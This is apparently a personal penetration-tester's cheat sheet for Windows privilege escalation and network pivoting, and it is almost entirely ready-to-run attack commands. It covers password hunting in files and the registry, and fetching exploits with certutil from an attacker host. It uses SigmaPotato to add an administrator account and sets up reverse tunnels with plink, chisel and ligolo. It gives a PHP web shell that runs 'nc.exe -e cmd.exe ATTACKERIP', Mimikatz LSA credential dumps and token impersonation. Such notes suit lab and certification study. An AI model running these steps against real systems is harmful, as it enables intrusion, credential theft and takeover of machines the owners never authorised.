2. Gaining a foothold

	a. check for ftp ports, logins, anonymous login
	b. check for webservers etc
	c. check if you can upload files and access from the URL,
	eg file: test.txt
	URL: 192.168.50.141/test.txt

	d. if possible to upload files, then you can actually go and upload payloads.
	eg IIS servers -- aspx

3. Initial Enumeration

	3i) System Enumeration
	a. get the system information first like architecture,
	OS name, OS Version, System Type
	command: sysinfo

	b. wmic qfe (check the windows patches & hotfixes - some may be available, some may not)
	wmic qfe Caption,Description,HotFixID,InstalledOn

	c. Get disk types and how many drives
	wmic logicaldisk get caption,description,providername
	
	3ii) User Enumeration
	a. get who is the user.
	command: whoami
	get your list of prvileges
	command: whoami /priv
	get your group list
	command: whoami /groups
	get list of users accounts. Does not refer to service accounts
	command: net user
	
	check administrator group users
	command: net localgroup administrator

	3iii) Network Enumeration
	
	a. ipconfig /all
	Get all information about the current networks
		
	b. arp -a
	Get the list of connected machines
	
	c. route
	Get the routes connected in the network
	
	d. netstat -ano
	find out all the ports that are connected to the current device


	3iv.) Password Hunting
	
	a. findstr /si password *.txt
	find the word passwords in .txt files

	findstr /si password *.txt *.ini *.config
	find even more of the word passwords in .txt, .ini, ,config as well

	3v.) AV & FW enumeration

	a. sc query windefend
	cmd command to see state of windows defender

	b. sc queryex type= service
	cmd command to see all services on the machine to see if any other anti-virus software like Sophos, Norton, Symmantec

	c. try either below commands to get firewall details 
	netsh advfirewall firewall dump
	netsh firewall show state

	netsh firewall show config
	- shows config, ports that are blocked.
	

4. Automated Tools

	i.) Executables

	Winpeas.exe --> more recommended --> https://github.com/peass-ng/PEASS-ng/releases/tag/20240915-f58aa30b
	seatbelt.exe (compile using VisualStudio)
	Watson.exe (compile using VisualStudio)
	sharpup.exe (compile using VisualStudio)
	
	ii.) PowerShell
	
	Sherlock.ps1
	PowerUp.ps1
	jaws-Enum.ps1

	iii.) Other

	windows-exploit-suggester.py (local)
	Exploit Suggester (Metasploit)
	
	a. WinPEAS
	either run the .exe or .bat
	WinPEAS.bat is a batch script if you are unable to run the .exe
	
	b. Sherlock.ps1
	Powershell script to quickly find missing software patches for local privilege escalation vulnerabilities.

	c. Windows-Exploit-Suggester.py
	a. use the systeminfo and put into a .txt file.
	b. in kali run the command: ./windows-exploit-suggester.py --update
	c. install python-xlrd / pip install xlrd --upgrade
	d. then run the windows-exploit-suggester.py on the .txt file in kali
	./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo theTXTfile.txt

	d. Powerup.ps1
	use this find find like unquoted service path / services that you can hijack

	e. find unquoted service path:
	cmd: wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
	powershell (manually find services and check): Get-CimInstance -ClassName win32_service | Select Name,State,PathName

	f. scheduled tasks:
	Find permissions where you can hijack like not in any system folder, inside user folder: schtasks /query /fo LIST /v | Select-String "C:\\Users"

	g. SigmaPotato
	run command:
	whoami /priv
	(make sure SeImpersonatePrivilege) is set as Enabled
	.\SigmaPotato "net user dave4 lab /add"
	download SigmaPotato to the host
	.\SigmaPotato "net localgroup Administrators dave4 /add"

5. Kernel Exploits
	Github.com/secwiki/windows-kernel-exploits
	
	a. Metasploit
		1. in a meterpreter, bg session
		2. run post/multi/recon/local_exploit_suggester
		3. use exploit/etc/etc
		4. options - set rhosts etc
		5. set sessions 1
		6. run
		7. getuid / whoami / getpwd
		
		
	b. Manual Method
		1. run windows-exploit-suggester.py
		2. from the bottom up till top, try to use the most below.
		3. download the exploit from github and upload to your attacker
		4. run a python host
		5. from victim shell, run the following command in cmd to download the exe.
			certutil -urlcache -f https://IPADDRESS:8000/ms10-059.exe ms.exe

6. Passwords & Port Forwarding
	
	a. Passwords
		1. Gain a foothold first - low level enumeration
		2. check list of all listening ports
		run netstat -ano
		3. check list of ip address in network
		run arp -a
		4. refer sushant747 guide:
			i.) look for passwords strings maybe? -- this will take a long time - use later
			ii.) use registry to do quicksearch for password
				eg in cmd.
				reg query "HKLM /f password /t REG_SZ /s
				
				use registry to find any logon passwords
				reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
				
				
	b. Port Forwarding (Plink)
		1. On Windows:
			google plink.exe putty download
			find plink.exe
			
		2. Get Plink.exe
			i. Start http server and host the plink.exe
			ii. In the victim shell, download plink.exe
			certutil -urlcache -f http://IPADDRESS:8000/plink.exe
		
		3. SSH (Make sure Kali has ssh installed)
			i. gedit /etc/ssh/sshd_config
			ii. Look for #permitrootlogin
			uncomment it. Then put it like below:
			PermitRootLogin yes
			iii. service ssh restart
			iv. service ssh start
		
		4. Back to victim shell:
			run the following command:
				plink.exe -l kali -pw kali -R 445:127.0.0.1:445 10.10.14.5
			Meaning port 445 on the victim machine will open up will now connect to port 445 on Kali machine
			10.10.14.5 - kali / attacker machine IP
			username: kali
			password: kali
			-R refers to port forward
			
			you will now be inside the Kali Terminal from the victim machine.
			

		5. in Kali, use winexe - executes linux commands on windows system.
		command: winexe -U Adminstrator%Welcome1! //127.0.0.1 "cmd.exe"
		change password (Welcome1!) as necessary
		may have to keep trying to get a system32 shell


	c. Port Forwarding (Chisel)
	
		====Section A - Scanning for networks from the Pivot Machine====
		1. SSH to a pivot machine
		2. Conduct a scan on the network, run the command below:
			for i in $(seq 254); do ping 10.1.2.${i} -c1 -W1 & done | grep from #replace 10.1.2. with the actual network
		
		3. In Kali, download static-binaries from Andrew-database
		depend if its windows or Linux Environment, download accordingly - nmapFILE
		
		4. From Kali, 
			scp nmapFILE user@10.1.1.10:/tmp
			
		5. From the pivot machine
			cd tmp
			./nmapFILE 10.1.2.5
			./nmapFILE 10.1.2.6
			
		====Section B - Chisel====
		
		1. Install chisel in kali
		https://github.com/jpillora/chisel
		curl https://i.jpillora.com/chisel! | bash

		check your chisel version after that
		chisel version
		
		2. copy chisel to the tmp directory at the pivot machine
		scp chisel user@10.1.1.10:/tmp
		
		3. In kali run like this:
		chisel server --socks5 --reverse
		
		Then, get the fingerprint like: hlvnjToetcetcroQ=
		
		4. In the SSH pivot machine, run the following command:
		
		For basic forwarding:
		./chisel client --fingerprint hlvnjToetcetcroQ= OriginalIPKALI:8080 R:8000:10.1.2.5:80
		
		For Port Forwarding of Reverse Shell etc Port 9999 of ssh machine will now connect to Attacker IP of port 9999
		./chisel client --fingerprint hlvnjToetcetcroQ= OriginalIPKALI:8080 0.0.0.0:9999:OriginalIPKALI:9999
		
		5. In Kali, go to web-browser, type in the address: localhost:8000, you will be able to access the server of 10.1.2.5:80
		
		6. If you need all services, you can do this in SSH Pivot Machine
		./chisel client --fingerprint hlvnjToetcetcroQ= OriginalIPKALI:8080 R:socks
		
		
		however you need proxychains.
		Back in Kali on the chisel server --socks5 --reverse:
		check the proxy#R - should be like below:
		proxy #R:127.0.0.1:1080=>socks.
		the 1080 should be the port that is bind to the proxy socks.
		
		7. open another kali terminal.
		Run the following command:
			i.) sudo subl /etc/proxychains4.conf
			ii.) Look for socks5 whatever at the bottom
			iii.) edit it like below: 
			socks5 127.0.0.1 1080 
			
			iv.) now all command, you can use : 
			proxychains curl http://10.1.2.5
		
		
		8. From browser, you can download foxyproxy addon
		set the following settings:
		
		proxyType: SOCKS5
		Proxy IP Address: 127.0.0.1
		Port: 1080
			
		Set the addon to be used. click on the addon and enable it.

	d. Port Forwarding (Ligolo)
		https://github.com/nicocha30/ligolo-ng >> go to releases page
		
		1. download Proxy file for Kali (Attacker)
		2. download Agent file for Windows (Pivot) agent.exe
		
		========= After Downloading =========
		
		3. setup a python http server on Kali
		4. Download the Agent File onto Windows from the python http server
		
		========= Setup =========
		Always Start from this First: (Number 5)
		5. On Kali Run the command below:
			sudo ip tuntap add user kali mode tun ligolo
			sudo ip link set ligolo up
		
			cd ligolo-proxy-linux
			./proxy -h (For help of ligolo)
		
		To run the Ligolo Proxy
			./proxy -selfcert 
		
		6. On Windows - execute ligolo
		run the following:
			ligolo-agent.exe -connect KALIIP_Address:11601 -ignore-cert
			
		7. back on Kali, in Ligolo, you can run help to get list of help.
		session -> show sessions - enter the number, to get the session
		
		========= Pivoting =========
		
		8. Back on Kali Normal Terminal: Add the Pivot to Kali
			sudo ip route add 10.10.120.0/24 dev ligolo (where the ip range is the list of IP)
		
		   show the list of IP route after adding in kali.
			ip route list
			
		9. Back on the Ligolo proxy sessions in Kali:
			start
			****You should see a tunnel session in Kali
			
		10. You should be able to run kali command on the 10.10.120.0/24 network already.
		
		========= Catching Reverse Shells =========
	
		11. In Kali, in the same listerner session, run the following:
		listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444  (any connection to the pivot, port 1234 will be forwarded to kali port 4444)
		
		listener_list (to see the listerners)
		
		12. Lets say we got a shell in some faraway machines and we want to to run netcat, we need to run like: this reverse shell is actually to the listerner which is then forwarded to Kali
		nc.exe 10.10.120.131 1234 -e cmd 
		
		========= Uploading Files =========

		13. In Kali, in the same listerner session, run the following:
		
		listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80 (use port 80 / 8000 depend on what port of the python webserver)
		listener_list (to see the listerners)
		
		14. In remote machine:
		certutil -urlcache -f http://10.10.120.131:1235/file.txt file.txt (using the ip address of the pivot machine)
		
		
		
		
		
		
7. Windows Subsystem for Linux

	a. Initial access
	Get a shell first, assuming you have credentials:
	i.) using impacket psexec
	ii.) If SMB server is open, IIS is up, you can try uploading nc.exe
		locate nc.exe --> /usr/share/windows-resources/binaries/nc.exe nc.exe
		put nc.exe in the smbclient
		Create a malicious PHP file --> rev.php
			<?php
			system('nc.exe -e cmd.exe ATTACKERIP PORT')
			?>
		put the PHP file in smbclient
		In Attacker, set up listener
		Access the URL/rev.php
		You will get a shell.
	iii.) With access, you can run systeminfo to see if you can get systeminfo
		check for windefender
		sc query windefend
	
	b.) Find Windows Subsystem for Linux
	where /R c:\windows bash.exe
	
	where /R c:\windows wsl.exe

	i.) run the wsl.exe with whoami
	filepath\wsl.exe whoami
	
	ii.) run the bash.exe
	filepath\bash.exe
	
	get a bin/bash shell:
	python -c import "import pty;pty.spawn('/bin/bash')
	
	type history
	to see if any administrator password is available.

	c.) After getting administrator password, from attacker machine
	to get a shell:
	i.) impacket-psexec administrator:'PASSWORD'@IPADDRESS
	ii.) impacket-smbexec administrator:'PASSWORD'@IPADDRESS
	--semi interactive shell
	(But this one is semi interactive. Better to put in one more NC to get a full reverse shell)
			
8. Get Token Overview

	a. Mimikatz - dump LSA Credentials
	From PowerShell:
	Invoke-Mimikatz -Command '"privilege::debug" "LSADump::LSA /patch" exit' -Computer DESKTOP1111

	Mimikatz - dump LSA - dump kerberos hash
	LSADump::LSA /patch
	
	b. Meterpreter - impersonate_token
	command: impersonate_token Domain\\Administrator

	c. Meterpreter - getprivs - shows the privilleges available on the current computer
		(more info: swisskyrepo -  windows privilege escalation - windows subsystem for linux wsl)
	command: getprives 
	
	d. Potato Attacks
		Trick the NT AUTHORITY\SYSTEM account into authenticating via NTLM to a TCP Endpoint
		Man in the middle this authentication attempt to locally negotiate a security token for the NT Authority\System account through a series of API calls
		Impersonate the token we just used. This can only be done using service accounts.
	
	usually use msfconsole.
		commands:
		i.) load incognito
		ii.) list_tokens -u
		iii.) impersonate_token "NT AUTHORITY\SYSTEM"
		iv.) shell
		v.) whoami



9. GetSystem:
	In Meterprer
	run the command: getsystem
	(this must be careful since it could crash the machine)


		
10. RunAS

	i.) From a CMD
	
	Get list of stored credentials:
	cmdkey /list
	
	Assuming output shows like user: ACCESS\Administrator

	you can run like the following command:
	C:\Windows\Systems32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\users\security\root.txt"

	


11. Others:
	DIR list deeper: dir /R
